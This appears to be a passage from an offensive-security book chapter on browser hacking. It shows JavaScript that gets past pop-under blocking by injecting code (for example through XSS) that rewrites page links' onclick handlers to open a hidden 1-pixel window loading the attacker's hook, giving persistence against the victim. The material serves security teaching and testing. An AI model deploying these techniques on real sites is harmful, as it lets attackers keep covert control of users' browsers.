
When you browse to a website, there is nothing more annoying than an unprompted pop-up. How many times have you been forced to repeatedly close multiple pop-ups displaying advertisements? Whereas a pop-up is a new browser window that appears in the foreground of the current browser page, a pop-under is a new browser window that appears in the background, literally under the current browser window. Most modern browsers block pop-under behavior by default.

The easiest way to open a pop-under with JavaScript is by using the `window.open()` method. The following code will be blocked by default in the latest versions of Firefox and Chrome:

``` 
window.open('http://example.com','popunder','toolbar=0
  location=0,directories=0,status=0,menubar=0,scrollbars=0,
  resizable=0,width=1,height=1,left='+screen.width+',
  top='+screen.height+'').blur();

window.focus();
```

The script is blocked because the browser realizes the new window will open without any user intervention, such as an explicit mouse click.

You might start to think how you can bypass this behavior. The first potential solution to examine is by using MouseEvents to programmatically instrument mouse actions through JavaScript code. Suppose you have a link you control, either by creating it dynamically or by exploiting an XSS vulnerability within an onClick attribute, similar to the following:

```
<a id="malicious_link" href="http://google.com" 
  onclick=" open_link()">Goo</a>
```

Now inject the following JavaScript in the same page:

```
function open_link(){
window.open('http://example.com','popunder','toolbar=0,
  location=0,directories=0,status=0,menubar=0,scrollbars=0,
  resizable=0,width=1,height=1,left='+screen.width+',
  top='+screen.height+'').blur();

window.focus(); 
}

function clickLink(link) {
  var cancelled = false;
  if (document.createEvent) {
    var event = document.createEvent("MouseEvents");
    event.initMouseEvent("click", true, true, window,
      0, 0, 0, 0, 0, false, false, false, false, 0, null);
    link.dispatchEvent(event);
  }else if(link.fireEvent){
    link.fireEvent("onclick");
  }
}
clickLink(document.getElementById('malicious_link'));
```

The preceding code tells the browser to execute the `clickLink()` function on the A element with the given ID, which contains the `window.open` call inside the onClick event. Unfortunately, this experiment will still not work because a MouseEvent created with JavaScript is not the same as a real user click.

To bypass this limitation, instead of relying on creating mouse events, you can be craftier and use JavaScript to add or overwrite onClick attributes on existing page links. This technique will be expanded further in the Man-in-the-Browser attacks section.

The following code retrieves all the `<a>` tags on the page, adding an onClick attribute that when triggered will open the pop-under. The `$.popunder()` function is a jQuery plugin14 written by Hans-Peter Buniat that creates cross-browser pop-under windows.

```
var anchors = document.getElementsByTagName("a");

for (var i = 0; i < anchors.length; i++) {
 if(anchors[i].hasAttribute("onclick")){
   anchors[i].removeAttribute("onclick");
 }
 // the aPopunder object is defined in the next code snippet
 anchors[i].setAttribute("onclick", "$.popunder(aPopunder)")
}
```

When the user clicks one of the page links, the URI in the href attribute will be opened, together with the pop-under. The pop-under is not blocked by default in modern browsers. The only browser that is not vulnerable in this instance is Opera.

Expanding on this, if you want to be as stealthy as possible, you can position the pop-under exactly behind the current browser window. You can achieve this by measuring the position of the current browser window using `window.screenX` and `window.screenY`. The height and width of the pop-under has to be set to at least 1 pixel because 0 pixels is blocked by most browsers. However, in most circumstances the resulting pop-under will be greater than 1 pixel, as you can see in [Figure 3-14](#c03.html#figure3-14). Note that the pop-unders have been manually positioned at the left of the main browser window, otherwise they would have been invisible to the user:

 start figure 

[**Figure 3-14:**](#c03.html#figureanchor3-14) Different pop-under dimensions in Firefox and Safari

![c03f014.tif](image_fi/662090c03/c03f014.png)

 end figure 

Using this information, you can modify the `$.popunder()` function in the following way:

```
var aPopunder = [
  ['http://browserhacker.com', {"window": {height:1,
    width:1, left:window.screenX, top:window.screenY}}];
$.popunder(aPopunder)
```

When the user clicks the link, which has been dynamically modified with the new onClick attribute as shown in the preceding code, a pop-under pointing to http://browserhacker.com will be loaded. What you want to achieve with this technique is to load a resource that contains your JavaScript hook. If you can combine it with the Man-in-the-Browser or IFrame techniques, you can prevent losing the hook if the victim closes the current hooked tab, achieving longer persistence.
